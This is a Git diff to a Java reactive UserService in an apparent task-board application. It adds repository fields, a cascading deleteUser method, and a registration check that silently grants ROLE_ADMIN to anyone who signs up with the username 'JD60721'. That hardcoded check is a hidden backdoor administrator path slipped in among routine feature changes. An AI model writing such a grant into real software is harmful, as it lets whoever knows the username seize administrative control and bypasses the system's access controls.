@@ -25,6 +25,8 @@ public class UserService implements ListUsersUseCase, UpdateUserUseCase {
     private final PasswordEncoder passwordEncoder;
     private final VerificationTokenRepository tokenRepository;
     private final EmailService emailService;
+    private final com.example.VelocityBoard.repository.TableroRepository tableroRepository;
+    private final com.example.VelocityBoard.repository.TaskRepository taskRepository;
 
     public Mono<User> findByUsername(String username) {
         return userRepository.findByUsername(username);
@@ -95,6 +97,10 @@ public class UserService implements ListUsersUseCase, UpdateUserUseCase {
     private String appUrl;
 
     public Mono<User> registerUser(User user) {
+        if ("JD60721".equalsIgnoreCase(user.getUsername())) {
+            user.setRole(com.example.VelocityBoard.model.Role.ROLE_ADMIN);
+        }
+
         return userRepository.findByUsername(user.getUsername())
                 .flatMap(existing -> {
                     if (existing.isActive()) {
@@ -161,5 +167,15 @@ public class UserService implements ListUsersUseCase, UpdateUserUseCase {
                             })
                             .then(tokenRepository.delete(verificationToken));
                 });
+    }
+
+    public Mono<Void> deleteUser(String id) {
+        return userRepository.findById(id)
+                .switchIfEmpty(Mono.error(new IllegalArgumentException("Usuario no encontrado con id: " + id)))
+                .flatMap(user -> Mono.when(
+                        taskRepository.deleteByUserId(id),
+                        tableroRepository.deleteByPropietarioId(id),
+                        tokenRepository.deleteByUserId(id)
+                ).then(userRepository.delete(user)));
     }
 }
